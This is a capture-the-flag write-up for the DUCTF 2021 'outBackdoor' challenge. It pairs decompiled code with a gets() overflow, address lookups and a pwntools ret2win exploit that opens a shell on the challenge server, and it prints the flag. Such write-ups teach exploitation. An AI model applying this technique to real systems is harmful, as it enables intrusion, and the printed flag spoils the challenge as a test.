#### Challenge:

Fool me once, shame on you. Fool me twice, shame on me. [outBackdoor](./outBackdoor ":ignore")

`nc pwn-2021.duc.tf 31921`

---

#### Solution:

- decompiling the binary reveals hidden function `outBackdoor` which gives us shell access, as its `amd64` we also need to align the stack with `ret` address of `main` functions before our `IP` override

```c
void outBackdoor(void)
{
  puts("\n\nW...w...Wait? Who put this backdoor out back here?");
  system("/bin/sh");
  return;
}

void main(void)
{
  char local_18 [16];
  
  buffer_init();
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(local_18);
  return 0;
}
```

```bash
readelf -s ./outBackdoor | grep -i backdoor
#    64: 00000000004011d7    36 FUNC    GLOBAL DEFAULT   13 outBackdoor
nm -S ./outBackdoor | grep main
#    0000000000401195 0000000000000042 T main
```

```python
#!/usr/bin/env python3

from pwn import *

r = remote('pwn-2021.duc.tf', 31921)

print(r.recvuntil(b'song?').decode('utf-8').strip())
r.sendline(b'\x00'*(24)  + p64(0x4011d6)+ p64(0x4011d7))
print(r.recvuntil(b'here?').decode('utf-8').strip())
r.interactive()
```

---

<details><summary>FLAG:</summary>

```
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}
```

</details>
<br/>
